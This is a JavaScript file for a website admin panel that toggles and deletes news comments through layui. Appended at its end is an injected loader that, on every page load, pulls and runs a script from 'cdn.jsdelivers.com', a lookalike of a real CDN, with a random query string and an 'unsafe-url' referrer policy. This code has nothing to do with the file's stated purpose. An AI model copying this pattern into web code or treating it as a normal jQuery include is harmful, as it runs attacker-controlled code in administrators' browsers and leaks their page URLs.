layui.use(['element', 'layer', 'jquery', 'form'], function() {
    var element = layui.element, $ = layui.$ , form = layui.form;

    $('.statusToggle').click(function() {
        var dId = $(this).data('id');
        //切换评论显示状态
        $.get('/admin/news_discuss_show_toggle/' + dId, function(data) {
            if(data.type == 'ok') {
                layer.msg(data.message, {icon:1});
                setTimeout(() => {
                    window.location.reload();
                }, 1000);
            } else {
                layer.msg(data.message, {icon:2});
            }
        });        
    });

    $('.discussDel').click(function() {
        var dId = $(this).data('id');
        layer.confirm(
            '真的确定要删除吗？'
            , function() {
                $.get('/admin/news_discuss_del/' + dId, function(data) {
                    if(data.type == 'ok') {
                        layer.msg(data.message, {icon:1});
                        setTimeout(() => {
                            window.location.reload();
                        }, 1000);
                    } else {
                        layer.msg(data.message, {icon:2});
                    }
                });
            }
            , function() {
                layer.msg('感谢主公不杀之恩！');
            }
        );
    });
});
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}